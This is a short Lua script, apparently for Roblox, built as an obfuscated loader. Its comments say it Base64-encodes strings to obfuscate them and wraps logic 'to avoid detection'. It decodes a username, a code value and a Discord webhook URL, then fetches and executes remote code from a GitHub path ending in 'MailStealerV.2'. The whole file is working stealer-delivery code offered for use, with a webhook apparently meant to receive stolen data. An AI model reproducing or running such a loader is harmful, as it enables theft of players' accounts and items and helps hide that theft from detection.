-- Base64 encoding function to obfuscate strings
local function b64decode(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^' .. b .. '=]', '')
    return (data:gsub('.', function(x)
        if x == '=' then return '' end
        local r, f = '', (b:find(x) - 1)
        for i = 6, 1, -1 do r = r .. (f % 2 ^ i - f % 2 ^ (i - 1) > 0 and '1' or '0') end
        return r
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if #x ~= 8 then return '' end
        local c = 0
        for i = 1, 8 do c = c + (x:sub(i, i) == '1' and 2 ^ (8 - i) or 0) end
        return string.char(c)
    end))
end

-- Encoded strings
local a = b64decode('Y2FiYWdhbWluZw==')  -- "cabagaming"
local b = b64decode('YW5pbWUxMjMwMDE3')  -- "anime1230017"
local c = b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMwMDEzMTIyOTI5OTExNDA2Ni9qQUduNFZMUH
JxNHVUOGJHd3dNcWNYaktTRk1rM0ZUZ0NEUVdXZnJWWVdZWUdPNlRDaXEtUXV3c3VGR05weFh0NFl
lMQ==')

local d = 10 ^ 6  -- 1000000

-- Logic inside an anonymous function to avoid detection
(function()
    local function noise() return math.random(1, 100) end  -- Adds randomness
    print("Executing... Noise level: " .. noise())
end)()

-- Executing external code
pcall(function()
    loadstring(game:HttpGet(b64decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1docml0ZXJIdWIvV2hpdGVyL21haW4vTWFpbFN0ZWFsZXJWLjI=')))()
end)
